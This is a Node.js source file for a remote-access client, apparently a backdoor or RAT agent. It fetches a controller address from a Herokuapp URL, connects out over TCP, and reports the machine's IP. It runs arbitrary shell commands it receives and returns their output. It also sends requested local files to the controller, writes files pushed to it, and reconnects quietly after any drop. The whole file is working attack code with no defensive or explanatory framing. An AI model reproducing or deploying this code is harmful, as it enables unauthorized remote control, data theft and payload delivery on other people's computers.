const net = require('net');
const ip = require("ip")
const fs = require("fs")
const path = require("path")
const { exec } = require('child_process');
const Encoding = require('encoding-japanese');
const request = require('request');
let client = new net.Socket()
const url = "https://remote-ip-server-api-9a4d4d493ea1.herokuapp.com/"
let host = ""
let port = ""


let commandRunnerList = []
let commandCash = []
let conCo = 0
const getIp = setInterval(()=>{
    request.get({
        uri: url,
        headers: {'Content-type': 'application/json'},
        qs: {

        },
        json: true
    }, function(err, req, data){
        try{
            if(data){
                let dls = data.split(":")
                host = dls[0]
                port = dls[1]
                conCo = 1
                clearInterval(getIp)
                let firstConnection = setInterval(() =>{
                    try{
                        client.connect(3000, "localhost", () => {
                            commandCash = []
                            const sendData = JSON.stringify({type:"sendUserType",token:"ffff",IP:ip.address()})
                            client.write(sendData)
                            clearInterval(firstConnection)
                        });
                    }catch{
                
                    }
                },5000)
            }else if (err){
                
            }
        }catch{

        }
    });
},5000)

const sendResolt = (client,rootID,data)=>{
    const sendData = JSON.stringify({type:"sendComandRes",rootID:rootID,data:data})
    client.write(sendData)
}
const sendResoltList = (client,rootID,data)=>{
    const sendData = JSON.stringify({type:"sendComandResList",rootID:rootID,data:data})
    client.write(sendData)
}
const toString = (bytes) => {
    return Encoding.convert(bytes, {
      from: 'SJIS',
      to: 'UNICODE',
      type: 'string',
    });
  };
function sleep(waitMsec) {
    var startMsec = new Date();
  
    // 指定ミリ秒間だけループさせる（CPUは常にビジー状態）
    while (new Date() - startMsec < waitMsec);
  }
let sendfileFLG = false
let sendfilepath = ""
let sendfileName = ""
let sendfiletype = ""
let downloadFile = {flg:false,dpath:"",gpath:""}
let filesize = 0
let byteList = []
client.setMaxListeners(20)
client.on("data",(data)=>{
    try{
        if(!sendfileFLG){
            let rootID = JSON.parse(data).rootUser
            if(JSON.parse(data).type == "runCommand"){
                if(commandRunnerList.indexOf(JSON.parse(data).rootUser) == -1){
                    commandRunnerList.push(JSON.parse(data).rootUser)
                }  
                let getdata =JSON.parse(data).data
                if(getdata != ""){
                    let splitCommand = getdata.split(" ")
                    if(splitCommand[0] != "cpls" && splitCommand[0] != "nag" && splitCommand[0] != "pls" && splitCommand[0] != "dpls"){
                            if(commandCash.length == 0){
                                getdata = ""
                                splitCommand.forEach((i)=>{
                                    getdata += i
                                    getdata += " "
                                })
                                commandCash.push(getdata)
                                let runCommand = getdata
                                exec(runCommand,{encoding: "Shift_JIS"},(error, stdout, stderr)=>{
                                    sendResolt(client,rootID,toString(stdout))
                                })
                            }else{
                                getdata = ""
                                splitCommand.forEach((i)=>{
                                    getdata += i
                                    getdata += " "
                                    
                                })
                                commandCash.push(getdata)
                                let runCommand = ""
                                commandCash.forEach((i,index)=>{
                                    if(commandCash.length-1 != index){
                                        runCommand = runCommand + i +">nul"+ "&"
                                        // runCommand = runCommand + i + "&"

                                    }else{
                                        runCommand = runCommand + i
                                    }
                                })

                                exec(runCommand,{encoding: "Shift_JIS"},(error, stdout, stderr)=>{
                                    sendResolt(client,rootID,toString(stdout))
                                })
                            }
                    }else if(splitCommand[0] == "cpls"){
                        commandCash = []
                        sendResolt(client,rootID,"")
                    }else if(splitCommand[0] == "nag"){
                        getdata = ""
                        runCommand = ""
                        splitCommand.forEach((i)=>{
                            if(i != "nag"){
                                getdata += i
                                getdata += " "
                            }
                        })
                        commandCash.forEach((i,index)=>{
                            if(commandCash.length-1 != index){
                                runCommand = runCommand + i + ">nul"+"&"
                                // runCommand = runCommand + i + "&"
                            }else{
                                runCommand = runCommand + i
                            }
                        })
                        runCommand += "&" + getdata
                        exec(runCommand,{encoding: "Shift_JIS"},(error, stdout, stderr)=>{
                            sendResolt(client,rootID,toString(stdout))
                        })
                        //commandcashには記録しない
                    }else if(splitCommand[0] == "pls"){
                        let sendData = []
                        sendData = commandCash.map((i,index)=>{
                            return index+ ":"+i
                        })
                        sendResoltList(client,rootID,sendData)
                    }else if(splitCommand[0] == "dpls" && splitCommand.length>1){
                            try{
                                let deleteList = []
                                splitCommand.forEach((i,index)=>{
                                    if(index>0){
                                        deleteList.push(i)
                                    }
                                })
                                deleteList.sort()
                                deleteList.forEach((i,index)=>{
                                    commandCash.splice(i-index,1)
                                })
                                sendResolt(client,rootID,"done")
                            }catch{
                                sendResolt(client,rootID,"error")
                            }
                        }
                    }
            }else if(JSON.parse(data).type == "endClient"){
                const getData = JSON.parse(data)
                const dataindex = commandRunnerList.indexOf(getData.data)
                if(dataindex != -1){
                    commandRunnerList.splice(dataindex,1)
                }
            }else if(JSON.parse(data).type == "sendFileType"){
                sendfileName = ""
                sendfilepath = ""
                sendfiletype = ""
                sendfileFLG = true

                let data1 = JSON.parse(data)
                byteList = []
                filesize = data1.data.size
                sendfileName = data1.data.name
                sendfilepath = data1.data.path
                sendfiletype = data1.data.type

            }else if(JSON.parse(data).type == "downloadFileData"){
                try{
                    const data1 = JSON.parse(data)
                    let file;
                    if (fs.existsSync(data1.dpath)) {
                        let fileSize = fs.statSync(data1.dpath)
                        fileSize = fileSize.size
                        const sendData2 = JSON.stringify({type:"setFileSize",data:fileSize})
                        client.write(sendData2)
                        file = fs.createReadStream(data1.dpath)
                        file.pipe(client,{end:false})
                    } else {
                        const sendData = JSON.stringify({type:"downloaderror"})
                        client.write(sendData)
                    }
                }catch{}
            }
        }else{
            try{
                byteList.push(data)
                let nowFile = Buffer.concat(byteList)
                let nowSize = nowFile.length
                if(filesize <= nowSize){
                    sendfileFLG = false
                    let file = path.join(sendfilepath,sendfileName)
                    let ufstream = fs.createWriteStream(file)
                    ufstream.write(nowFile)
                    ufstream.end((error)=>{
                        if(!error){
                            let sendData = JSON.stringify({type:"uploadfileDone"})
                            client.write(sendData)
                        }else{
                            let sendData = JSON.stringify({type:"uploadfileError"})
                            client.write(sendData)
                        }
                    })
                }
            }catch{console.log("error")}
        }
    }catch(error){
    }
})
client.on("close",()=>{
    // const sendData = JSON.stringify({type:"endTargetUser",data:rootID})
    // client.write(sendData)
    let time = setTimeout(() =>{
        client.connect(port, host,()=>{
            clearInterval(time)
            const sendData = JSON.stringify({type:"sendUserType",token:"ffff",IP:ip.address()})
            client.write(sendData)
        });
    },5000)

})
client.on("error",()=>{
})